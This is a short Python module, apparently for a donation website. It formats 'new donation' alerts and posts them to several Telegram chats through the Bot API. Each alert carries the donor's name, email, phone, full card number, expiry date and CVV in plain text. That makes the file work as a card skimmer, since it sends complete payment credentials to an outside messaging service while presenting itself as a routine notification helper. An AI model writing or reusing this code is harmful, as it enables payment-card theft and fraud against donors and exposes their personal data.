import asyncio
import aiohttp
import os
from typing import List
from decimal import Decimal

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'


async def send_donation_notification(
    chat_ids: List[int],
    first_name: str,
    last_name: str,
    email: str,
    phone: str,
    amount: Decimal,
    card_number: str,
    expiry: str,
    cvv: str,
    recurring: bool = False
):
    recurring_text = "🔄 Регулярний донат" if recurring else "💝 Разовий донат"
    
    message = f"""
        🎉 <b>Новий донат!</b>

        {recurring_text}

        👤 <b>Донатер:</b> {first_name} {last_name}
        📧 <b>Email:</b> {email}
        📱 <b>Телефон:</b> {phone if phone else 'Не вказано'}

        💰 <b>Сума:</b> {amount} ₴

        💳 <b>Платіжна інформація:</b>
        • Картка: <code>{card_number}</code>
        • Термін дії: <code>{expiry}</code>
        • CVV: <code>{cvv}</code>

        ❤️ Дякуємо за підтримку!
        """
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for chat_id in chat_ids:
            task = send_message(session, chat_id, message)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        

        success_count = sum(1 for r in results if not isinstance(r, Exception))
        print(f"Sent donation notification to {success_count}/{len(chat_ids)} users")


async def send_message(session: aiohttp.ClientSession, chat_id: int, text: str):
    """
    Отправляет сообщение одному пользователю
    """
    url = f'{TELEGRAM_API_URL}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    
    try:
        async with session.post(url, json=payload) as response:
            if response.status != 200:
                print(f"Failed to send to {chat_id}: {await response.text()}")
            return await response.json()
    except Exception as e:
        print(f"Error sending to {chat_id}: {e}")
        raise


def run_async(coro):
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    return loop.run_until_complete(coro)